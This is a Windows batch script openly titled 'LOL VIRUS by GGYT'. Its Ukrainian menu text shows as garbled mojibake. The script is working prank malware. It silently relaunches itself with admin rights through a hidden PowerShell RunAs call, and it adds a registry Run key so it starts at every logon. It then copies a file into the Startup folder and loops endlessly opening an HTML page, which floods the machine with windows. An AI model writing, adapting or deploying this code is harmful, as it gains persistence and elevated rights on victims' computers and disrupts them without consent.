@echo off
call :Adm
title LOL VIRUS by GGYT 
chcp 866
color a
cls
goto vir

:vir
cls
type C:\LOL_VIRUS\files\art.txt
echo �����i�� �i�:
echo.
echo 1 - ���� ����� ��
echo 2 - ����
echo 3 - �� ��������
echo 4 - ����� �������� (�� ᪮�)
echo 5 - �� ��� �i���?

echo.
Set /p choice="��� ���i�: "
if not defined choice goto vir
if "%choice%"=="1" (goto xd)
if "%choice%"=="2" (goto exit)
if "%choice%"=="3" (start C:\LOL_VIRUS\files\languages\ukr\NOT_OPEN_ME_PLEASE.html)
if "%choice%"=="4" (goto vir)
if "%choice%"=="5" (goto path)
cls
goto vir

:exit
set choice=0
cls
echo �� �筮 ��� ����? (y/n)
Set /p choice="���i�: "
if not defined choice goto exit
if "%choice%"=="n" (goto vir)
if "%choice%"=="y" (exit)
cls
goto exit

:xd
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v 111 /t REG_SZ /d "C:\LOL_VIRUS\files\xd.bat"
cls
goto yt

:yt
xcopy C:\LOL_VIRUS\files\xd "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /H
cd C:\LOL_VIRUS\files\
start base.html
goto yt

:path
cls
echo.
echo �i� � C:\LOL_VIRUS
pause
goto vir

:Adm
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit 
)





